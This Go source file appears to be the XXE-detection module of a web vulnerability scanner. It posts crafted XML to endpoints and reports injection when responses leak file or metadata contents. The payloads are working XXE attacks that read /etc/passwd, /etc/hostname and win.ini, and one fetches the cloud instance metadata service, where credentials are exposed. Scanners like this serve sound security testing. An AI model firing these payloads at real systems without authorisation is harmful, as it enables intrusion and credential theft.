package modules

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"regexp"
	"strings"
	"time"
)

type xxePayload struct {
	Body    string
	Label   string
	Markers []string
}

func base64HostnameToken(body string) string {
	b64 := regexp.MustCompile(`[A-Za-z0-9+/]{8,}={0,2}`)
	for _, tok := range b64.FindAllString(body, -1) {
		dec, err := base64.StdEncoding.DecodeString(tok)
		if err != nil {
			continue
		}
		s := strings.TrimSpace(string(dec))
		if len(s) >= 2 && len(s) <= 63 && hostnameTokenRe.MatchString(s) {
			return s
		}
	}
	return ""
}

var hostnameTokenRe = regexp.MustCompile(`(?is)<\s*/?\s*[a-z0-9:_-]{1,40}\s*>\s*([a-z0-9][a-z0-9_.-]{0,62})\s*</`)

var xxePayloads = []xxePayload{
	{
		Label: "Classic /etc/passwd (DOCTYPE SYSTEM)",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{"root:x:", "nobody:x:", "/bin/bash", "/sbin/nologin", "/bin/sh"},
	},
	{
		Label: "Parameter entity /etc/passwd",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;]>
<root/>`,
		Markers: []string{"root:x:", "nonexistent/root", "/etc/passwd"},
	},
	{
		Label: "/etc/hostname",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{},
	},
	{
		Label: "Windows win.ini",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{"[fonts]", "[extensions]", "[mci extensions]"},
	},
	{
		Label: "XXE via SVG (if endpoint accepts images)",
		Body: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>`,
		Markers: []string{"root:x:", "nobody:x:", "/bin/bash"},
	},
	{
		Label: "OOB via http (canary test without callback server)",
		Body: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>`,
		Markers: []string{"ami-id", "instance-id", "security-credentials"},
	},
}

var xxeContentTypes = []string{
	"application/xml",
	"text/xml",
	"application/xhtml+xml",
	"application/rss+xml",
	"application/atom+xml",
	"image/svg+xml",
}

func doXMLPOST(client *http.Client, cfg *core.Config, rawURL, body, contentType string) (string, int, error) {
	req, err := http.NewRequest("POST", rawURL, bytes.NewBufferString(body))
	if err != nil {
		return "", 0, err
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Set("Content-Type", contentType)
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b := core.ReadBody(resp.Body)
	return b, resp.StatusCode, nil
}

func ScanXXE(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	postEndpoints := map[string]bool{}
	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "POST" && form.Action != "" {
			postEndpoints[form.Action] = true
		}
	}
	postEndpoints[target.URL] = true

	for endpoint := range postEndpoints {
		if cfg.Verbose {
			output.Verbose("[xxe] probing %s", endpoint)
		}

		const benignXML = `<?xml version="1.0" encoding="UTF-8"?><root><data>test</data></root>`

	XXECTLoop:
		for _, ct := range xxeContentTypes {
			baselineBody, baselineStatus, err := doXMLPOST(client, cfg, endpoint, benignXML, ct)
			if err != nil || baselineStatus == 404 || baselineStatus == 405 {
				continue
			}

			for _, pl := range xxePayloads {
				body, status, err := doXMLPOST(client, cfg, endpoint, pl.Body, ct)
				if err != nil || status == 404 || status == 405 {
					continue
				}

				bodyLow := strings.ToLower(body)

				for _, marker := range pl.Markers {
					if strings.Contains(bodyLow, strings.ToLower(marker)) &&
						!strings.Contains(strings.ToLower(baselineBody), strings.ToLower(marker)) {
						results = append(results, core.ScanResult{
							Type: "XXE (XML External Entity Injection)",
							URL:  endpoint, Method: "POST", Parameter: ct,
							Payload: pl.Label, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("marker %q found in response (HTTP %d)", marker, status),
							Timestamp: time.Now(),
						})
						break XXECTLoop
					}
				}

				if len(pl.Markers) == 0 {
					if m := hostnameTokenRe.FindStringSubmatch(body); len(m) == 2 && !strings.Contains(strings.ToLower(baselineBody), m[1]) {
						results = append(results, core.ScanResult{
							Type: "XXE (XML External Entity Injection)",
							URL:  endpoint, Method: "POST", Parameter: ct,
							Payload: pl.Label, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("/etc/hostname returned %q (HTTP %d)", m[1], status),
							Timestamp: time.Now(),
						})
						break XXECTLoop
					}
					if tok := base64HostnameToken(body); tok != "" && !strings.Contains(strings.ToLower(baselineBody), tok) {
						results = append(results, core.ScanResult{
							Type: "XXE (XML External Entity Injection)",
							URL:  endpoint, Method: "POST", Parameter: ct,
							Payload: pl.Label, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("/etc/hostname (base64) returned %q (HTTP %d)", tok, status),
							Timestamp: time.Now(),
						})
						break XXECTLoop
					}
				}

				lenDiff := len(body) - len(baselineBody)
				if lenDiff < 0 {
					lenDiff = -lenDiff
				}
				statusChanged := status >= 400 || (status >= 200 && status < 400 && (baselineStatus >= 400 || baselineStatus < 200))
				if status >= 200 && status < 400 && baselineStatus >= 200 && baselineStatus < 400 &&
					lenDiff > 2000 && status != baselineStatus {
					results = append(results, core.ScanResult{
						Type: "XXE (Potential — Anomalous Response)",
						URL:  endpoint, Method: "POST", Parameter: ct,
						Payload: pl.Label, Severity: "MEDIUM",
						Evidence:  fmt.Sprintf("response diff: %d bytes, status %d → %d", lenDiff, baselineStatus, status),
						Timestamp: time.Now(),
					})
					break XXECTLoop
				}
				if statusChanged && lenDiff > 500 {
					results = append(results, core.ScanResult{
						Type: "XXE (Potential — Anomalous Response)",
						URL:  endpoint, Method: "POST", Parameter: ct,
						Payload: pl.Label, Severity: "MEDIUM",
						Evidence:  fmt.Sprintf("response diff: %d bytes, status %d → %d", lenDiff, baselineStatus, status),
						Timestamp: time.Now(),
					})
					break XXECTLoop
				}
			}
		}
	}

	return results
}
